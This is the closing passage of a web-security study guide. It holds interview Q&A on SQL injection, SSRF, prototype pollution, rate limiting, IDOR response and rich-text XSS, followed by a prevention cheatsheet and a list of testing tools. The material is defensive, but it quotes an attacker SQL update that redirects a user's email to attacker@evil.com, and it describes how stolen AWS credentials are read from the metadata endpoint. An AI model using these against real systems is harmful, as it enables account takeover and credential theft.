SQL injection can affect ANY query, not just authentication. An attacker can dump all tables (users, orders, messages), exfiltrate data via UNION attacks, modify records (`UPDATE users SET email='attacker@evil.com' WHERE id=1`), or with certain databases execute OS commands (`xp_cmdshell` in MSSQL). Password hashing prevents plain-text exposure of passwords but doesn't prevent data exfiltration or modification. The fix is always parameterized queries — not the password hashing algorithm.

---

**Q: What does the SameSite cookie attribute do?**

It controls whether a cookie is sent on cross-site requests. `SameSite=Strict`: cookie is never sent cross-site (prevents CSRF entirely; also prevents the cookie from being sent when a user clicks a link from another site). `SameSite=Lax` (browser default): cookie is sent cross-site only for top-level GET navigations (clicking links), not for POST forms, XHR, or img/script tags (prevents most CSRF). `SameSite=None`: cookie is always sent cross-site (requires Secure flag; needed for third-party cookies, OAuth redirects to embedded apps).

---

### Intermediate

**Q: How does SSRF to the AWS metadata endpoint compromise an entire AWS account?**

AWS EC2 instances have a metadata endpoint at `169.254.169.254`. With IMDSv1, any HTTP request from the instance can reach it — no authentication needed. The endpoint at `/latest/meta-data/iam/security-credentials/<role-name>` returns temporary AWS credentials (AccessKeyId, SecretAccessKey, SessionToken) for the IAM role assigned to the instance. If the EC2 role has broad permissions (e.g., `AdministratorAccess`), the attacker has full AWS API access: read S3 buckets, access RDS, call STS to pivot, modify IAM. Prevention: enforce IMDSv2 (`--http-tokens required`) which requires a PUT handshake that SSRF typically can't perform; use VPC endpoint policies to restrict metadata access; apply least-privilege IAM roles to EC2 instances.

---

**Q: What is prototype pollution and what's its security impact?**

Prototype pollution occurs when attacker-controlled data is merged into an object using a recursive merge that doesn't sanitize keys like `__proto__` or `constructor.prototype`. Since all JavaScript objects inherit from `Object.prototype`, modifying it affects every object in the application. Impact: privilege escalation (setting `isAdmin: true` on the prototype), bypassing security checks, path traversal bypass, even RCE in some Node.js contexts (e.g., `child_process.exec` argument injection via polluted config objects). Prevention: use `Object.create(null)` for maps, sanitize `__proto__`/`constructor` keys in merge functions, use `JSON.parse` for data (which doesn't pollute), freeze `Object.prototype` in security-critical code, keep lodash updated.

---

**Q: Walk me through how you would implement a secure rate limiter for a login endpoint.**

Implement in layers:
1. **IP-based limiting**: 10 attempts per IP per 15 minutes (redis-backed `rate-limiter-flexible` for multi-server). Block for 1 hour after exhausting attempts.
2. **Username-based limiting**: independently limit attempts per username (stops distributed attacks across IPs). Combined key: `ip:username`.
3. **Account lockout**: lock the account server-side after 10 failed attempts, require email unlock or wait period.
4. **Consistent response time**: always `bcrypt.compare()` even for non-existent users (using a dummy hash) to prevent timing-based username enumeration.
5. **CAPTCHA**: after 3 failures, require CAPTCHA before further attempts. Only add friction at failure point, not on first attempt.
6. **Alerting**: when an account hits lockout, email the user and log for investigation.
7. **Return `Retry-After` header** on 429 responses — standard and transparent.
8. **Denylist compromised credentials**: on each successful login, check the password against HaveIBeenPwned API; if breached, force password reset.

---

### Senior / Pro

**Q: A security researcher reports an IDOR in your API. What is your response process?**

Triage (0-4 hours):
1. Reproduce with minimal test case to confirm severity.
2. Determine blast radius: which endpoints are affected? What data is accessible? Is it read-only or writable?
3. Review access logs: has this been exploited? Extract attacker IPs, user agents, affected resources.

Containment (4-24 hours):
4. If write IDOR: emergency patch or feature flag to disable the endpoint.
5. If read IDOR on sensitive data (PII, financial): immediate patch AND notification to affected users if data was accessed.
6. Add rate limiting/alerting on the endpoint to detect ongoing exploitation.

Remediation:
7. Implement ownership check in query: `WHERE id = ? AND user_id = ?`.
8. Write regression test that proves the IDOR is fixed AND would have caught it originally.
9. Audit ALL similar endpoints with the same pattern — IDORs are usually systemic, not isolated.
10. Update threat model, add IDOR to code review checklist and automated DAST scans.

Disclosure:
11. Credit the researcher (HackerOne/Bugcrowd disclosure), pay bounty if program exists.
12. Write post-mortem: root cause, timeline, controls that should have caught this earlier.

---

**Q: How would you prevent XSS in a React application that allows users to enter rich text (bold, italic, links)?**

Rich text is the hardest XSS scenario because you need to allow SOME HTML.

1. **Never use `dangerouslySetInnerHTML` directly**: even if you sanitize, mistakes happen.
2. **DOMPurify**: sanitize server-side AND client-side. Use a strict config:
   ```javascript
   DOMPurify.sanitize(input, {
     ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'p', 'br'],
     ALLOWED_ATTR: ['href', 'rel', 'target'],
     FORCE_BODY: true,
   });
   ```
3. **Link sanitization**: validate all `href` values — only allow `http://` and `https://` protocols (prevent `javascript:` URIs). Add `rel="noopener noreferrer"` to all external links.
4. **Use a rich text component library** (Tiptap, Quill, Slate.js) that sanitizes its own output.
5. **Store as Markdown**: don't store raw HTML — store Markdown in the DB, render to HTML at display time with a sanitized Markdown renderer (marked + DOMPurify, or react-markdown).
6. **CSP**: `Content-Security-Policy: script-src 'self'` prevents inline script execution even if sanitization is bypassed. Use `require-trusted-types-for 'script'` for Trusted Types enforcement.
7. **Regular scanning**: run tools like OWASP ZAP or Burp Suite in CI against the rich text input to catch new XSS variants.

---

## 25. Cheatsheet: Attacks + Prevention

### Attack vs Prevention Quick Reference

```text
Attack                 Root Cause                    Primary Prevention
─────────────────────────────────────────────────────────────────────────────
XSS Stored/Reflected   Unsanitized output to HTML    Output encoding + DOMPurify + CSP
XSS DOM                Unsafe innerHTML/eval         textContent + DOMPurify + Trusted Types
CSRF                   Browser sends cookies cross-site  SameSite=Lax/Strict + CSRF token
CORS Misconfiguration  Wildcard or reflected Origin  Explicit origin allowlist + Vary: Origin
SQL Injection          String-concatenated queries   Parameterized queries (prepared statements)
Command Injection      exec() with user input        execFile() + arg arrays + no shell
Path Traversal         Unvalidated file paths        path.resolve() + startsWith() check
SSRF                   Unvalidated fetch targets     IP range allowlist + DNS re-resolution
IDOR                   Missing ownership check       WHERE id=? AND user_id=? in every query
Brute Force            No attempt limiting           Rate limiter (IP+user) + CAPTCHA + MFA
Clickjacking           Missing frame protection      frame-ancestors 'none' + X-Frame-Options
XXE                    External entities enabled     Disable DTD/entity loading in parser
Insecure Deserialization  Native deserialize untrusted  Use JSON, sign/validate tokens
JWT alg:none           Algorithm not enforced        { algorithms: ['HS256'] } in verify()
JWT weak secret        Guessable signing key         256-bit random secret / RSA keys
Prototype Pollution    Unguarded recursive merge     Key sanitization + Object.create(null)
Open Redirect          Unvalidated redirect URL      Same-origin validation before redirect
SSTI                   User input in template string Pass as context, not template text
Mass Assignment        Binding all request fields    Explicit field allowlist (pick)
ReDoS                  Evil regex + long input       RE2 engine + input length limits
Supply Chain           Unvetted dependencies         npm audit + lock files + Dependabot
```

### Secure HTTP Headers (Minimal Set)

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'; base-uri 'self'
```

### OWASP Input Validation Cheat Sheet

```javascript
// Allowlist approach (preferred — specify what IS allowed)
const SAFE_NAME    = /^[a-zA-Z\s'\-]{1,100}$/;
const SAFE_EMAIL   = /^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,254}$/;
const SAFE_PHONE   = /^\+?[0-9\s\-\(\)]{7,20}$/;
const SAFE_AMOUNT  = /^\d{1,8}(\.\d{1,2})?$/;
const SAFE_UUID    = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

// Type coercion (never trust types from user input)
const id     = parseInt(req.params.id, 10);
const amount = parseFloat(req.body.amount);
if (!Number.isFinite(id) || id <= 0) return res.status(400).send('Invalid ID');

// Zod schema validation (recommended for APIs)
const schema = z.object({
  email:    z.string().email().max(254),
  password: z.string().min(8).max(128),
  amount:   z.number().positive().max(100000),
  role:     z.enum(['user', 'editor']),   // NOT 'admin' — mass assignment prevention
});
```

### Password Security

```javascript
// Hashing: never MD5, SHA1, SHA256 for passwords
// Use: bcrypt (recommended), Argon2id (more modern), scrypt
const bcrypt = require('bcrypt');

// Storing:
const SALT_ROUNDS = 12;  // min 10, 12-14 for high-security
const hash = await bcrypt.hash(plainPassword, SALT_ROUNDS);

// Verifying:
const match = await bcrypt.compare(submittedPassword, storedHash);

// Password requirements (NIST 800-63B 2024):
// ✓ Minimum 8 chars (prefer 12+)
// ✓ Check against breached password lists (HaveIBeenPwned)
// ✓ Allow long passwords (up to 128 chars)
// ✓ Allow all characters (spaces, symbols, Unicode)
// ✗ No mandatory complexity rules (uppercase+number+symbol)
// ✗ No periodic forced rotation (unless breach suspected)
// ✗ No password hints
// ✓ Support paste in password fields
```

### Security Testing Tools

```bash
# SAST (Static Analysis):
semgrep --config=auto .          # open-source rules for SQLi, SSRF, XSS, etc.
eslint-plugin-security           # npm package, lints for security issues
bandit -r .                      # Python SAST

# DAST (Dynamic Scanning):
nikto -h https://yoursite.com    # quick web server misconfiguration check
OWASP ZAP (zaproxy.org)          # full DAST scanner, active + passive
nuclei -u https://yoursite.com   # fast template-based vuln scanner

# Dependency Scanning:
npm audit
snyk test
trivy image myapp:latest          # container + filesystem

# Header Checks:
curl -I https://yoursite.com       # check response headers
https://securityheaders.com        # free online header checker

# SSL/TLS:
testssl.sh --fast yoursite.com    # TLS configuration check
https://ssllabs.com/ssltest       # online SSL Labs test (grades A-F)

# JWT:
jwt.io                            # decode + verify JWTs
jwt_tool (Python)                 # JWT attack toolkit

# Manual:
Burp Suite Community/Pro          # intercept proxy, scanner, intruder
OWASP WSTG (Web Security Testing Guide) — manual testing methodology
```

---

*Track covers: threat model + attacker mindset, XSS (stored/reflected/DOM, DOMPurify, CSP, Trusted Types, nonce), CSRF (SameSite cookies, CSRF tokens, double-submit cookie, Origin validation), CORS misconfigurations (reflected Origin, null origin, prefix bypass, correct allowlist + Vary header), SQL injection (union/blind/time-based, parameterized queries, ORM pitfalls, least-privilege DB user), command injection (exec vs execFile, argument arrays), path traversal (path.resolve + startsWith guard), SSRF (cloud metadata, IMDS attacks, IP range blocking, DNS re-resolution, IMDSv2), IDOR (missing ownership checks, UUID vs sequential IDs, RBAC middleware), rate limiting (sliding window, Redis-backed, per-IP+username, progressive lockout, HaveIBeenPwned check, consistent timing), clickjacking (X-Frame-Options, CSP frame-ancestors), XXE (external entity attacks, XML bombs, parser hardening), insecure deserialization (pickle/Java ObjectInputStream, signed JSON), JWT attacks (alg:none, HS256/RS256 confusion, weak secret brute force, missing revocation, sensitive payload), prototype pollution (__proto__ merge, Object.create(null), Object.freeze), open redirect (same-origin validation), SSTI (Jinja2/Handlebars, sandboxed environment), mass assignment (field allowlist, Zod schema), ReDoS (catastrophic backtracking, RE2 engine), security misconfiguration (verbose errors, default creds, debug endpoints, Helmet.js), supply chain attacks (dependency confusion, typosquatting, Dependabot, npm ci), complete HTTP security headers reference (CSP, HSTS, X-Content-Type-Options, Referrer-Policy, Permissions-Policy), OWASP Top 10 (2021) mapping, interview Q&A (beginner → MAANG-level incident response + rich-text XSS), cheatsheet (all attacks, prevention, password security, NIST guidelines, security testing tools).*
